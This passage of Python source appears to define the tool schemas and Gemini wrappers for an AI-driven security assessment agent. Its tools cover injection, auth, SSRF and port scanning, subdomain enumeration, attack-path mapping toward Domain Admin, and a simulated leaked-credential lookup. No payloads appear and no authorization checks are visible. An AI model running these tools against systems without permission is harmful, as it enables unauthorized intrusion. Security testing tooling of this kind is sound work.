                        "param": {"type": "string", "description": "Parameter name to inject into"},
                        "injection_type": {"type": "string", "enum": ["all", "sqli", "xss", "command", "ssti"], "description": "Type of injection to test"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "auth_tester",
                "description": "Tests authentication and session security (brute force protection, session handling, cookies). Covers vulnerabilities #14-21.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "access_control_tester",
                "description": "Tests for access control issues (IDOR, privilege escalation, forced browsing, sensitive file exposure). Covers vulnerabilities #40-44.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "security_config_scanner",
                "description": "Scans for security misconfigurations (headers, CORS, information disclosure). Covers vulnerabilities #26-36.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "ssrf_tester",
                "description": "Tests for Server-Side Request Forgery vulnerabilities. Covers vulnerabilities #66, #87-88.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL with parameter"},
                        "param": {"type": "string", "description": "Parameter name that accepts URLs"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "subdomain_finder",
                "description": "Enumerates subdomains for a domain via DNS bruteforce.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Target domain"}
                    },
                    "required": ["domain"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "dir_scanner",
                "description": "Discovers hidden directories, files, and sensitive endpoints. Covers #29 Directory Listing.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "port_scanner",
                "description": "Scans for open ports and services. Covers #31 Open Ports and Services.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Target hostname or IP"},
                        "ports": {"type": "string", "description": "Port range (e.g., '80,443,8080' or '1-1000')"}
                    },
                    "required": ["target"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "tech_detect",
                "description": "Identifies technologies, frameworks, and CMS used by the target.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "ssl_scanner",
                "description": "Checks SSL/TLS configuration, certificates, and cipher strength. Covers #52-55 Insecure Communication.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "hostname": {"type": "string", "description": "Target hostname"}
                    },
                    "required": ["hostname"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "dns_lookup",
                "description": "Queries DNS records (A, AAAA, MX, TXT, NS, CNAME).",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Target domain"},
                        "record_type": {"type": "string", "enum": ["A", "AAAA", "MX", "TXT", "NS", "CNAME"]}
                    },
                    "required": ["domain"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "whois_lookup",
                "description": "Retrieves domain registration and ownership information.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Target domain"}
                    },
                    "required": ["domain"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "http_headers",
                "description": "Fetches and displays all HTTP response headers.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "url": {"type": "string", "description": "Target URL"}
                    },
                    "required": ["url"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "generate_report",
                "description": "Generates a comprehensive security assessment report in markdown format.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "target": {"type": "string", "description": "Target that was assessed"},
                        "findings": {"type": "string", "description": "Compiled findings from all tools"}
                    },
                    "required": ["target"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "file_inspect",
                "description": "Reads the content of a local file.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "Path to the file"}
                    },
                    "required": ["path"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "cloud_audit",
                "description": "Checks for common cloud (AWS, Azure, GCP) misconfigurations.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "domain": {"type": "string", "description": "Target domain"}
                    },
                    "required": ["domain"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "ci_cd_scanner",
                "description": "Audits CI/CD pipeline files for secrets and misconfigurations.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {"type": "string", "description": "Path to scan"}
                    }
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "attack_path_mapper",
                "description": "Maps potential lateral movement and privilege escalation paths.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "start_node": {"type": "string", "description": "Starting machine/user"},
                        "target_node": {"type": "string", "description": "Objective (e.g. Domain Admin)"}
                    },
                    "required": ["start_node"]
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "log_analyzer",
                "description": "Analyzes security logs for signs of intrusion.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "log_content": {"type": "string", "description": "Content of logs to analyze"}
                    }
                }
            }
        },
        {
            "type": "function",
            "function": {
                "name": "dark_web_scanner",
                "description": "Scans simulated dark web databases for leaked credentials.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "description": "Query (e.g. domain or email)"}
                    },
                    "required": ["query"]
                }
            }
        }
    ]

# ==================== GEMINI FUNCTION WRAPPERS ====================

def injection_scanner(url: str, param: str = "", injection_type: str = "all") -> str:
    return AVAILABLE_TOOLS["injection_scanner"].execute(url, param, injection_type)

def auth_tester(url: str) -> str:
    return AVAILABLE_TOOLS["auth_tester"].execute(url)

def access_control_tester(url: str) -> str:
    return AVAILABLE_TOOLS["access_control_tester"].execute(url)

def security_config_scanner(url: str) -> str:
    return AVAILABLE_TOOLS["security_config_scanner"].execute(url)

def ssrf_tester(url: str, param: str = "url") -> str:
    return AVAILABLE_TOOLS["ssrf_tester"].execute(url, param)

def subdomain_finder(domain: str) -> str:
    return AVAILABLE_TOOLS["subdomain_finder"].execute(domain)

def dir_scanner(url: str) -> str:
    return AVAILABLE_TOOLS["dir_scanner"].execute(url)

def port_scanner(target: str, ports: str = "80,443,8080") -> str:
    return AVAILABLE_TOOLS["port_scanner"].execute(target, ports)

def tech_detect(url: str) -> str:
    return AVAILABLE_TOOLS["tech_detect"].execute(url)

def ssl_scanner(hostname: str) -> str:
    return AVAILABLE_TOOLS["ssl_scanner"].execute(hostname)

def dns_lookup(domain: str, record_type: str = "A") -> str:
    return AVAILABLE_TOOLS["dns_lookup"].execute(domain, record_type)

def whois_lookup(domain: str) -> str:
    return AVAILABLE_TOOLS["whois_lookup"].execute(domain)

def http_headers(url: str) -> str:
    return AVAILABLE_TOOLS["http_headers"].execute(url)

def generate_report(target: str, findings: str = "") -> str:
    return AVAILABLE_TOOLS["generate_report"].execute(target, findings)

def file_inspect(path: str) -> str:
    return AVAILABLE_TOOLS["file_inspect"].execute(path)

def cloud_audit(domain: str) -> str:
    return AVAILABLE_TOOLS["cloud_audit"].execute(domain)

def ci_cd_scanner(path: str = ".") -> str:
    return AVAILABLE_TOOLS["ci_cd_scanner"].execute(path)

def attack_path_mapper(start_node: str, target_node: str = "Domain Admin") -> str:
    return AVAILABLE_TOOLS["attack_path_mapper"].execute(start_node, target_node)

def log_analyzer(log_content: str = "") -> str:
    return AVAILABLE_TOOLS["log_analyzer"].execute(log_content)

def dark_web_scanner(query: str) -> str:
    return AVAILABLE_TOOLS["dark_web_scanner"].execute(query)

def save_pdf_report(target: str, findings_json: str = "") -> str:
    """Saves a professional PDF security report."""
    try:
        from report_generator import SecurityReport
        
        report = SecurityReport(target)
        
        # Parse findings if provided as JSON
        if findings_json:
            try:
                findings_list = json.loads(findings_json)
                for f in findings_list:
                    report.add_finding(
                        title=f.get('title', 'Unknown'),
                        severity=f.get('severity', 'INFO'),
                        description=f.get('description', ''),
                        evidence=f.get('evidence', ''),
                        recommendation=f.get('recommendation', ''),
                        category=f.get('category', '')
                    )
            except:
                # If not valid JSON, add as single finding
                report.add_finding(
                    title="Scan Results",
                    severity="INFO",
                    description=findings_json
                )
        
        # Save reports
        results = report.save(".")
        
        output = f"Reports generated for {target}:\n\n"
        output += f"  - Markdown: {os.path.basename(results.get('markdown', 'Error.md'))}\n"
        output += f"  - PDF: {os.path.basename(results.get('pdf', 'Not available.pdf'))}\n"

        
        return output

        
    except ImportError:
        return "Error: Report generator not available. Make sure report_generator.py exists."
    except Exception as e:
        return f"Error: {str(e)}"

GEMINI_TOOLS = [
    injection_scanner, auth_tester, access_control_tester, security_config_scanner,
    ssrf_tester, subdomain_finder, dir_scanner, port_scanner, tech_detect,
    ssl_scanner, dns_lookup, whois_lookup, http_headers, generate_report, file_inspect,
    save_pdf_report, cloud_audit, ci_cd_scanner, attack_path_mapper, log_analyzer,
    dark_web_scanner
]


